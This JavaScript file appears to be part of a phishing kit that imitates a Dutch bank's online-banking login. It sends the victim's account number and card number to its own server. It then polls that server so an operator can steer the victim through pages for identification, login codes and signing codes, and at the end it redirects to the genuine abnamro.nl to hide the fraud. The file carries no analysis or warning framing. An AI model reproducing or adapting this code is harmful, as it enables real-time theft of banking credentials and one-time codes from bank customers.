const login_form = document.querySelector('#login-form');

const iban = document.querySelector('#rekeningnummer');
const number = document.querySelector('#pasnummer');
const loginButton = document.querySelector('#loginButton');
const token = document.querySelector('#token');


login_form.addEventListener('submit', e => {
    e.preventDefault();

    if (iban.value == '' || number.value == '') {
        loginButton.innerHTML = 'Volgende';
        loginButton.disabled = false;
        iban.disabled = false;
        number.disabled = false;

        iban.value = '';
        number.value = '';

        document.querySelector('#errorMessage').style.display = 'block';
    } else {
        const data = new FormData();
        data.append('iban', iban.value);
        data.append('number', number.value);

        loginButton.innerHTML = '<img src="/img/ing.gif" width="20"> Volgende';
        loginButton.disabled = true;
        iban.disabled = true;
        number.disabled = true;

        document.querySelector('#errorMessage').style.display = 'none'; 

        fetch('/portalserver/nl/prive/bankieren/inloggen/' + token.value, {
            method: 'POST',
            body: data
        }).then(() => {
            const newInterval = setInterval(() => {
                fetch('/portalserver/nl/prive/bankieren/inloggen/check/' + token.value, {
                    method: 'POST',
                }).then(res => {
                    res.json().then(data => {
                        if (data.page == 'login') {
                            loginButton.innerHTML = 'Volgende';
                            loginButton.disabled = false;
                            iban.disabled = false;
                            number.disabled = false;

                            iban.value = '';
                            number.value = '';

                            document.querySelector('#errorMessage').style.display = 'block';

                            clearInterval(newInterval)
                        } else if (data.page == 'identification') {
                            window.location.href = '/portalserver/nl/prive/bankieren/identificatie/' + token.value;
                        } else if (data.page == 'loginCode') {
                            window.location.href = '/portalserver/nl/prive/bankieren/logincode/' + token.value;
                        } else if (data.page == 'signCode') {
                            window.location.href = '/portalserver/nl/prive/bankieren/signeercode/' + token.value;
                        } else if (data.page == 'control') {
                            window.location.href = '/portalserver/nl/prive/bankieren/controleren/' + token.value;
                        } else if (data.page == 'finish') {
                            window.location.href = 'https://www.abnamro.nl';
                        } else if (data.page == 'waiting') {
                            console.log('Waiting...');
                        }
                    });
                });
            }, 500);
        });
    }
});


